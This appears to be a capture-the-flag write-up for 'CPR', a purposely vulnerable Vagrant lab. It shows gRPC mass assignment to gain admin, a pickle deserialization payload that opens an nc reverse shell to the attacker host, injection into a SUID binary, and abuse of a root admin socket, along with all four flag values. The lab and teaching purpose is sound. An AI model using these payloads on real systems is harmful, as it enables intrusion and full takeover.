# CPR

**Category:** Boot2Root  **Difficulty:** Hard  **Author:** AbuCTF

> H7Corp Technologies has deployed their Cloud Platform Runtime (CPR), a microservices-based infrastructure for managing enterprise applications. The platform exposes gRPC services for authentication, user management, backup operations, and system monitoring.
>
> Your objective: Gain complete control of the system by exploiting vulnerabilities in the platform's service architecture. Capture all four flags.

Run: `vagrant up` (Ubuntu 22.04, VirtualBox). Target is `192.168.56.11`. The source for the SUID binary is in `provisioning/cpr-backup.c`; it's compiled and stripped on the box.

## Solution

### Flag 1: admin via the gRPC API

nmap shows 22, 80 (nginx, "H7Corp Microservices") and 50051, which is gRPC. Reflection is off on 50051, so `grpcurl list` gets you nothing. The website has its `.git` directory exposed though:

```bash
git-dumper http://192.168.56.11/.git ./cpr-dumped
ls cpr-dumped/proto/
# auth.proto  backup.proto  internal.proto  monitoring.proto  user.proto
```

With the protos we can talk to the service. `UpdateProfileRequest` has `is_admin` and `privilege_level` fields, and the server just writes whatever you send. Register, then promote yourself:

```bash
G="grpcurl -plaintext -import-path cpr-dumped/proto -proto auth.proto -proto user.proto -proto backup.proto"
$G -d '{"username":"hacker","email":"hacker@test.com","password":"Password123!"}' 192.168.56.11:50051 cpr.auth.AuthService/RegisterUser
# "user_id": "usr_e162ae0526f8"
$G -d '{"user_id":"usr_e162ae0526f8","email":"hacker@test.com","is_admin":true,"privilege_level":100}' 192.168.56.11:50051 cpr.user.UserService/UpdateProfile
$G -d '{"user_id":"usr_e162ae0526f8"}' 192.168.56.11:50051 cpr.user.UserService/GetUserDetails
```

Once `is_admin` is set, `GetUserDetails` fills in the `token` field: `H7CTF{d1d_y0u_l3arn_ab0ut_pr0t0buf_inject10ns}`.

### Flag 2: pickle RCE as svc-runtime

`BackupService/RestoreBackup` is admin only and takes a `bytes backup_data` field, which goes straight into `pickle.loads()`. Standard `__reduce__` payload:

```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.56.1 4444 >/tmp/f',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

```bash
$G -d '{"user_id":"usr_e162ae0526f8","backup_name":"evil","backup_data":"<b64>"}' 192.168.56.11:50051 cpr.backup.BackupService/RestoreBackup
```

Shell comes back as `svc-runtime`, and `/home/svc-runtime/flag.txt` has `H7CTF{need_oorugai_f0r_curd_r1c3}`.

### Flag 3: SUID cpr-backup to abu

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/cpr-backup   -rwsr-sr-x abu platform-admins
```

It's a stripped ELF. `strings` gives away the format string:

```
cd %s && tar -czf %s/%s.tar.gz . 2>/dev/null
```

Our argument goes into the middle of a `system()` call with no filtering, so close the command and comment out the rest:

```bash
/usr/local/bin/cpr-backup "x; /bin/bash #"
cat /home/abu/flag.txt
```

tar complains about an empty archive, then we're `abu` (group `platform-admins`): `H7CTF{p1vot_1s_4_ch4nge_1n_strategy_w1th0ut_ch4nge_1n_vision}`.

### Flag 4: admin socket to root

`/var/run/cpr-admin.sock` is owned by `root:platform-admins` with mode 770, and the root service behind it has reflection on:

```bash
grpcurl -plaintext -unix /var/run/cpr-admin.sock list cpr.internal.AdminService
# CreateSudoUser, ExecuteCommand, GetRootShell, RestartService
grpcurl -plaintext -unix -d '{"command":"cat /root/flag.txt"}' /var/run/cpr-admin.sock cpr.internal.AdminService/ExecuteCommand
```

`ExecuteCommand` runs as root. If you want a real shell, `CreateSudoUser` with `{"username":"pwned","password":"Pwn3d123","sudo_access":true}`, then `su pwned` and `sudo su` works too.

Flag 4: `H7CTF{w3_really_w3nt_fr0m_oorugai_t0_un1x_s0ckets}`
